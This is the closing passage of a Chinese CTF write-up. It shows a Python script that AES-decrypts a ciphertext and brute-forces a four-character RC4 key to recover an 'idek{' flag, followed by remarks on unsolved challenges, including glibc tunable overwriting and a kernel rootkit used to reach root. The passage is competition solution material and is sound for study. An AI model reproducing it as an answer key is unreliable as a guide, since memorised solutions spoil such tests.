#print(AES_cryptor.decrypt(b64decode('YWUwMjk3N2E4NzM3ZGU2YjA0MGI4YWQ0NTUxYTAyMTNiOGIyMDY3NDI0MWViOGRkODRjMTRlNzRjZjMzNzc3Mkx1xPsoSCKHaQSUHhFAEtmQw6V3Bxw3Y2XdsbG3/CVE')[64:]))
#print(AES_cryptor.decrypt(b64decode('6ZnYHjOSTfzczMCaWwQkX699J7l1Dp7o0sV6EdujGH8=')))
#print(AES_cryptor.decrypt(b64decode('tJ023I7QC4uPgU/w2aIUAc4sz/EdGbg1xQCEUVb2qD2S+f7ZCsmQ+Q91PeWv0JRf')))
#print(AES_cryptor.decrypt(b64decode('jZOOa5bplXDXTEKBj873UI3kbp1z/IJcL9uxBCoQIdk=')))
#print(AES_cryptor.decrypt(b64decode('6ZnYHjOSTfzczMCaWwQkX699J7l1Dp7o0sV6EdujGH8=')))
#print(AES_cryptor.decrypt(b64decode('lF7EVQ5ZlA5m6fpvlaArIkjBK135u5ggbMqLiMbdcdweHYMUwgo4ss7XTBqpUQi3')))
#print(AES_cryptor.decrypt(b64decode('7ufqZaQC+47ju2bBJ8sGURP2GVqO+H3W1DM7WgwTxFIy4uO8Slw5Vhw0DQLT4P7+')))

enc = b64decode('+6pZVSFOV2hyrZuwZB7X/OIgUFVXzcjRsd0hpVM+Hs0NjT2SgrL+G/yHBujpw5Ax')
AES_cryptor = AES.new(AES_key, AES.MODE_CBC, AES_iv)
enc = AES_cryptor.decrypt(enc)
table = list(b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789')
for a in table:
    for b in table:
        for c in table:
            for d in table:
                key = bytes([a,b,c,d])
                rc4_cryptor = ARC4.new(key)
                m = rc4_cryptor.decrypt(enc)
                if b'idek{' in m:
                    print(key)
                    print(m)
```

## 结语:

pwn还有一个题目是`MinkyMomo`关于改环境变量覆盖tunable来进行利用的,后面经过复现和研究后会发在复现文章后,另外逆向还有一个`Angery` autorev,需要修改一些约束和利用claripy来缩短一些运算的时间,不过个人认为这个约束明文字符可以减少时间是个很奇怪的trick.不过当时也使用了memory.store所以可能时间很长也就没跑出来.`Hardest Demon Bloodbath by Riot`是作者写了个`Geometry Dash`的地图 并且地图由`SPWN`语言编写 所以算比较新颖的一个题目.`Gone Fishing`个人认为是这些中最好的题目,其预期是通过`lsmod`发现rootkit的存在然后并分析rootkit进而提到root.

